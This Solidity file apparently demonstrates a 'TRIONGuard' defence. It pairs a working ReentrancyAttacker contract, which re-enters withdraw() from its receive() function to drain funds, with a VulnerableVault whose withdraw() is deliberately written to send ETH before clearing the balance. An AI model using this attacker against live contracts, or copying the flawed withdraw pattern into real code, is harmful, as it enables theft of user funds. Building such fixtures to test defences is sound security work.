// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./TRIONGuard.sol";

/**
 * @title ReentrancyAttacker
 * @dev Simulates an attacker contract that exploits a reentrancy flaw.
 *      On receiving ETH it immediately calls withdraw() again,
 *      draining the vault before balances are updated.
 */
contract ReentrancyAttacker {
    VulnerableVault public target;
    uint256 public stolenAmount;

    constructor(address payable _target) {
        target = VulnerableVault(_target);
    }

    function attack() external payable {
        require(msg.value > 0, "Need ETH to seed attack");
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    // Called by the vault during withdraw() — re-enters before state clears
    receive() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw();
        }
        stolenAmount += msg.value;
    }

    function getStolen() external view returns (uint256) {
        return stolenAmount;
    }
}

/**
 * @title VulnerableVault
 * @dev A mock DeFi vault with a CLASSIC reentrancy vulnerability:
 *      ETH is sent to the caller BEFORE the balance is zeroed.
 *
 *      The `withdraw()` function is wrapped in `trionProtected`, so
 *      TRION can freeze it the instant the L0 engine detects anomalous
 *      behavioral coherence — blocking the exploit at the execution layer.
 */
contract VulnerableVault is TRIONGuard {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    constructor(address _oracle) TRIONGuard(_oracle) {}

    function deposit() external payable {
        require(msg.value > 0, "Must deposit ETH");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @dev INTENTIONALLY VULNERABLE to reentrancy.
     *      External call fires BEFORE balance is cleared — a textbook exploit.
     *      Protected by TRION: if the oracle signals anomaly, this reverts
     *      with "TRION: SILENCE" before a single wei can leave.
     */
    function withdraw() external trionProtected {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Nothing to withdraw");

        // ⚠ VULNERABILITY: external call before state update
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "Transfer failed");

        // State update happens AFTER the call — attacker re-enters here
        balances[msg.sender] = 0;
        emit Withdrawal(msg.sender, amount);
    }

    function vaultBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
